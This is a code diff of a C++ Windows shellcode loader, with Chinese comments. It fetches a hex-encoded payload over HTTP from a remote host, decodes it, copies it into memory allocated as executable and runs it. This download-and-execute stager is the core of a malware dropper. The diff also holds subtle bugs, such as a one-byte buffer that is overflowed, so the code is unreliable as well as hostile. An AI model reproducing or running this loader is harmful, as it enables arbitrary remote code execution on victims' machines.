@@ -116,34 +116,51 @@ string GetShellcode(string strHost, string strRequestStr, int port)
         return strHtml;
 }
 
-
-unsigned char hex_2_dec(unsigned char c) {
-    if (c >= '0' && c <= '9') return c - '0';
-    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+int hexstringtobyte(char* in, unsigned char* out);
+int hexstringtobyte(char* in, unsigned char* out) {
+    int len = (int)strlen(in);
+    char* str = (char*)malloc(len);
+    memset(str, 0, len);
+    memcpy(str, in, len);
+    for (int i = 0; i < len; i += 2) {
+        //小写转大写
+        if (str[i] >= 'a' && str[i] <= 'f') str[i] = str[i] & ~0x20;
+        if (str[i + 1] >= 'a' && str[i] <= 'f') str[i + 1] = str[i + 1] & ~0x20;
+        //处理第前4位
+        if (str[i] >= 'A' && str[i] <= 'F') {
+            out[i / 2] = (str[i] - 'A' + 10) << 4;
+        }    
+        else {
+            out[i / 2] = (str[i] & ~0x30) << 4;
+        }
+        //处理后4位, 并组合起来
+        if (str[i + 1] >= 'A' && str[i + 1] <= 'F') {
+            out[i / 2] |= (str[i + 1] - 'A' + 10);
+        }
+        else {
+            out[i / 2] |= (str[i + 1] & ~0x30);
+        }
+        //if ((out[i / 2] ^ out[i / 2] >> 31) - (out[i / 2] >> 31)) {
+        //    out[i / 2] = (( (~(out[i / 2] << 1)>>1) + 1 )<<1)>>1;
+        //}
+    }
+    free(str);
+    return 0;
 }
 
 int main(int argc, char** argv)
 {
 
     string str = GetShellcode("ip", "?shellcode=1", 80);
-    cout << str << endl;
-    int len = strlen((char*)str.c_str());
-    unsigned char t1;
-    char* code = NULL;
-    for (int i = 1; i <= len; i += 2) {
-        t1 = hex_2_dec(str.c_str()[i - 1]);
-        t1 = 16 * t1 + hex_2_dec(str.c_str()[i]);
-        code[i / 2] = t1;
-    }
-    
+    char* p = (char*)str.c_str();
+    unsigned char code[] = { 0 };
+    hexstringtobyte(p, code); 
 
-    //void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
-    //memcpy(exec, code, memory_allocation);
-    //DWORD ignore;
-    //VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
-    //(*(void (*)()) exec)();
+    //for (int i = 0; i < strlen(p) / 2; i++) {
+    //    printf("%d ", code[i]);
+    //}
 
-    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, code, sizeof(code));
+    void* exec = VirtualAlloc(0, strlen(p)/2+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, code, strlen(p)/2+1);
     ((void(*)())exec)();
 }
